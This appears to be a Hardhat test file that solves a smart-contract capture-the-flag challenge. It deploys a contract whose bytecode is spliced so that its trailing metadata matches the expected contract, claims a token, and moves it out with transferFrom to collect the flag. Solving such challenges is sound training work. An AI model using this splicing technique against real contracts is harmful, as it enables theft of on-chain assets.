import { expect } from "chai";
import { ethers } from "hardhat";
import {
    ChallengeToken,
    OnlyICanHazToken,
    ExtendedOnlyICanHazToken__factory
} from "../typechain";

// This "Challenge Setup" block must be left as-is
describe("Challenge Setup", function () {
    it("Should deploy ChallengeToken", async function () {
        const ChallengeTokenFactory = await ethers.getContractFactory("ChallengeToken", (await ethers.getSigners()).pop());
        const challengeToken = await ChallengeTokenFactory.deploy();
        await challengeToken.deployed();
    });
});

// Try to solve the challenge below this line
// Run `npx hardhat ctf-try` to test your solution locally
// Run `npx hardhat ctf-try --submit` to submit your solution to the remote CTF node and get the real flag
describe("Solve Challenge", function () {
    let challengeToken: ChallengeToken;
    let onlyICanHazToken: OnlyICanHazToken;

    it("Should deploy OnlyICanHazToken succesfully", async function () {
        challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");

        let OnlyICanHazToken = await ethers.getContractFactory("ExtendedOnlyICanHazToken");
        OnlyICanHazToken = new ethers.ContractFactory(OnlyICanHazToken.interface, OnlyICanHazToken.bytecode.substr(0, OnlyICanHazToken.bytecode.length - 100) + (await ethers.getContractFactory("OnlyICanHazToken")).bytecode.substr(-100), OnlyICanHazToken.signer) as ExtendedOnlyICanHazToken__factory;
        onlyICanHazToken = await OnlyICanHazToken.deploy();
        await onlyICanHazToken.deployed();
    });

    it("ChallengeToken should send OnlyICanHazToken a token", async function () {
        expect(await challengeToken.balanceOf(onlyICanHazToken.address)).to.equal(0);
        await challengeToken.can_i_haz_token(onlyICanHazToken.address);
        expect(await challengeToken.balanceOf(onlyICanHazToken.address)).to.equal(1);
    });

    it("Should transfer token to EOA using approval", async function () {
        const [EOA] = await ethers.getSigners();

        expect(await challengeToken.balanceOf(EOA.address)).to.equal(0);
        await expect(challengeToken.transferFrom(onlyICanHazToken.address, EOA.address, 1)).to.not.reverted;
        expect(await challengeToken.balanceOf(EOA.address)).to.equal(1);
    });

    it("Should return the winning flag", async function () {
        const returnedFlag = await challengeToken.did_i_win()

        console.log(`\tThe returned flag is: "${returnedFlag}"`)
    });
});
